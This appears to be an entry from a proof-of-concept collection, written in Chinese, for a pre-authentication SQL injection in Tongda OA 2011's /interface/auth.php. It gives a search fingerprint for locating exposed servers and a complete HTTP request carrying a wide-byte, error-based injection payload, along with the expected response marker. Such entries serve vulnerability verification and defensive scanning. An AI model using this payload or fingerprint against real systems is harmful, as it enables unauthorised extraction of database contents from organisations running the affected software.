﻿# 通达OA interface前台SQL注入漏洞

> 更新时间：2023-12-25

> 漏洞编号：

> 漏洞说明：通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。通达OA /interface/auth.php 存在SQL注入漏洞,攻击者通过漏洞可以获取数据库信息。影响版本 通达OA2011

> 漏洞特征：title="office Anywhere" && icon_hash="-759108386" && "2011"

> 验证脚本：HTTP

```
GET /interface/auth.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1122)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23 HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：3b712de481375

> 上传文件定位：


> 验证文件来源：通达OA interface前台SQL注入漏洞.poc
